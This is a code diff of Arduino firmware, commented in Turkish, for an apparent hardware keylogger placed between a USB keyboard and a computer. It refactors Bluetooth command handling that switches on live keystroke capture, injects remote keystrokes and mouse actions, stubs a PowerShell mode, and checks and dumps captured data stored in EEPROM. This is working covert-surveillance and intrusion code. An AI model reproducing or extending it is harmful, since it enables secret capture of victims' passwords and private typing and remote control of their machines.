@@ -65,7 +65,6 @@ char input_byteData;
 String printed;
 boolean blueCommit = 0;
 boolean blueKeyboard = 0;
-boolean blueKeyboardInput = 0;
 boolean blueKeylogger = 0;
 boolean blueKeyIn = 0; // eger normal tusa basilmissa 1 olur
 boolean blueMouse = 0;
@@ -114,6 +113,10 @@ int pastKeyChecked = 0;
 int specialKapa = 0;
 
 boolean combinePress = 0;
+
+//eeprom
+byte adressEnd;
+int _adressEnd;
 
 class KbdRptParser : public KeyboardReportParser
 {
@@ -476,128 +479,54 @@ void bluetoothData() {
     input_byteData = BT_1.read();//recieve value from bluetooth
     printed += input_byteData;
 
-    if (input_byteData == '#') {
-      printed = "";
-    }
+    if (input_byteData == '#') { printed = ""; }
+                 
+    if (printed == "$") {
 
+      blueKeyboard = 0;
+      blueMouse = 0;
+      blueKeylogger = 0; //live
+      printed = "";  
+      }
+    
     blueCommit = 1;
 
-    // keyboard icin ayri bir fonksiyon acamadim cunku BT_1.read olunca kodun yerine gore ilk veya ikinci karekter print olmuyor
-    // aslinda okunan BT_1.read degeri degiskene kaydedilip acilacak fonsiyon icinde kullanilabilirdi ama gerek gormuyorum
+    if (input_byteData != '#' && blueKeyboard == 1) { keyboardWrite(); } // BLUETOOTH KEYBOARD
 
-    if (input_byteData != '#' && blueKeyboard == 1) { // BLUETOOTH KEYBOARD
+    if (input_byteData != '#' && blueMouse == 1) { mouseWrite(); } // BLUETOOTH MOUSE
 
-      keyboardWrite();
-    }
-
-    if (input_byteData != '#' && blueMouse == 1) { // BLUETOOTH MOUSE
-
-      mouseWrite();
-    }
-
-    if (digitalRead(4) == 0) {
-      delay(1000);
-      Serial.println(printed);
-    }
-
+    if (digitalRead(4) == 0) { delay(1000); Serial.println(printed); }
   }
 }
 
-void bluetoothCommit() {
+void bluetoothCommit() 
+{
 
-  if (blueCommit == 1) {
+  if (blueCommit == 1) 
+  {
 
-    if (input_byteData == '#') { // kapama sarti basta cunku alta koyarsam klavye vs acilip kapanir ve kapali kalir
+    if (printed == "KEYBOARDOPEN") { blueKeyboard = 1; } // bluetooth ile klavye kontrolu icin gerekli kodlar
 
-      // tum bluetooth toollarini kapamak icin hash kullaniyorum
-      //blueKeyboard = 0;
-      //input_byteData;
-    }
+    if (printed == "MOUSEOPEN") { blueMouse = 1; } // bluetooth ile fare kontrol etmek icin gerekli kodlar.
 
-    if (printed == "CLEARINPUT") {
+    if (printed == "LIVEKEYLOGGEROPEN") { blueKeylogger = 1; } // bluetooth keylogger ozelligi icin gerekli kodlar.
 
-      ///
-    }
+    if (printed == "POWERSHELLOPEN") {} // bluetooth poweshell komutlarini kullanabilmek icin gerekli kodlar
 
-    if (printed == "KEYBOARDOPEN") {
+    if (printed == "EEPROMCHECK") { if(readEEPROM(disk1, 0) == 0) { BT_1.print("EEPROMISCLOSE"); } else if(readEEPROM(disk1, 0) == 1) { BT_1.print("EEPROMISOPEN"); } }
+                                    
+    if (printed == "EEPROMDATACHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }
 
-      // bluetooth ile klavye kontrolu icin gerekli kodlar
-      blueKeyboard = 1;
-    }
+    if (printed == "EEPROMSTART") {} // eeprom ozelligini acmak icin gerekli kelime
 
-    if (printed == "KEYBOARDCLOSE") {
-
-      // bluetooth ile klavye kontrolu icin gerekli kodlar
-      blueKeyboard = 0;
-    }
-
-    if (printed == "MOUSEOPEN") {
-
-      // bluetooth ile fare kontrol etmek icin gerekli kodlar
-      blueMouse = 1;
-    }
-
-    if (printed == "MOUSECLOSE") {
-
-      // bluetooth ile fare kontrol etmek icin gerekli kodlar
-      blueMouse = 0;
-    }
-
-    if (printed == "LIVEKEYLOGGEROPEN") {
-
-      // bluetooth keylogger ozelligi icin gerekli kodlar
-      blueKeylogger = 1;
-    }
-
-    if (printed == "LIVEKEYLOGGERCLOSE") {
-
-      // bluetooth keylogger ozelligini kapamak icin gerekli kodlar
-      blueKeylogger = 0;
-    }
-
-    if (printed == "POWERSHELLOPEN") {
-
-      // bluetooth poweshell komutlarini kullanabilmek icin gerekli kodlar
-    }
-
-    if (printed == "EEPROMCHECK") {
-
-      // EEPROMCHECKSTART yani veri gondermeye hazirsin ve bunu android`e gonderdin - android ustundeki gerekli clock calismaya basladi,
-      // eeprom ozelligi suanda acik mi onun bilgisini isteme kelimesi //EEPROMCHECKSTART //EEPROMISOPEN //EEPROMISCLOSE
-    }
-
-    if (printed == "EEPROMDATACHECK") {
-
-      // RATIOCHECKSTART yani ratio degerini gondermeye baslayabilirsin, android app ustundeki clock calismaya basladi
-      // eeprom hafizasi neakdar dolu onu gosterme kelimesi //RATIOCHECKSTART//RATIO0//RATIO110//RATIO1125//RATIO2640//RATIO4150//RATIO5160//RATIO6170//RATIO7180//RATIO8190//RATIO9199//RATIO100
-    }
-
-    if (printed == "CLOSEEEPROM") {
-
-      // eeprom ozelligini kapamak icin gerekli kelime
-    }
-
-    if (printed == "OPENEEPROM") {
-
-      // eeprom ozelligini acmak icin gerekli kelime
-    }
-
-    if (printed == "GETEEPROMDATA") {
-
-      // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime //EEPROMISFINISH == tum datayi attiktan sonra gonderilecek kelime
-    }
-
-    if (printed == "RATIOOK") {
-
-      // bu kelime geldiyse eger andrid app ratio degerini ekrana yazmistir, ratio`nun kac oldugunu gondermei kes artik
-    }
-
-  }
+    if (printed == "GETEEPROMDATA") {} // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime //EEPROMISFINISH == tum datayi attiktan sonra gonderilecek kelime
+ }
 
   blueCommit = 0;
 }
 
-void liveKeylogger() {
+void liveKeylogger() 
+{
 
   if (blueKeylogger == 1 && blueKeyIn == 1) {
 
@@ -607,30 +536,18 @@ void liveKeylogger() {
   }
 }
 
-void keyboardWrite() {
+void keyboardWrite() 
+{
 
   if (blueCommit == 1) {
-
-    if (printed == "CLEARINPUT") {
-
-      blueKeyboardInput = 1;
-    }
-
-    if (blueKeyboardInput == 1) {
-
-      input_byteData = "";
-      BT_1.print("CLEARINPUTOK");
-      blueKeyboardInput = 0;
-    }
-
-    Keyboard.print(input_byteData);//print char as recieved byte by byte
-
+    Keyboard.print(input_byteData); //print char as recieved byte by byte
     blueCommit = 0;
   }
 
 }
 
-void mouseWrite() {
+void mouseWrite() 
+{
   /*here we configure our code to recive spacifide val from the
         adapter and act accordingly
         some apps give you abilty to send any char you want and
@@ -685,7 +602,8 @@ void mouseWrite() {
 }
 
 
-void normalKeyWrite() {
+void normalKeyWrite() 
+{
 
   if (yeniZaman - eskiZaman > 1300 && tut == 0 && controlKeyChecked == 0) { // normal tuslarin seri yazdirilmasi, controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
     Keyboard.print(keyes);
@@ -693,14 +611,16 @@ void normalKeyWrite() {
   }
 }
 
-void specialKeyWrite() {
+void specialKeyWrite() 
+{
 
   if (SPECIAL_yeniZaman - SPECIAL_eskiZaman > 1300 && tut == 0 && special_tut == 1 && controlKeyChecked == 0) { // special_tut == 1 yani ozel tusa basilmis f1,f2,f3,tab,enter,home gibi, ozel tus bu sekilde seri yazdirilir
     Keyboard.press(specialChar);                                                                                // controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
   }
 }
 
-void combineKeyWrite() {
+void combineKeyWrite() 
+{
 
   if (ctrlControl == 1 && (special_tut == 1 || tut == 0)) {
     if (left_ctrlEnabled == 1) {
@@ -740,7 +660,8 @@ void combineKeyWrite() {
 
 }
 
-void fingerUp() {
+void fingerUp() 
+{
 
   if (controlKeyChecked == 2) { // ctrl - shift - alt - gui tuslarindan parmagimizi cektik
 
@@ -800,7 +721,8 @@ void fingerUp() {
 
 }
 
-void combineElse() {
+void combineElse() 
+{
 
   if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 0 && combinePress == 0)  { // burasi hatali, ilk basimda eski lastbutton geliyor
 
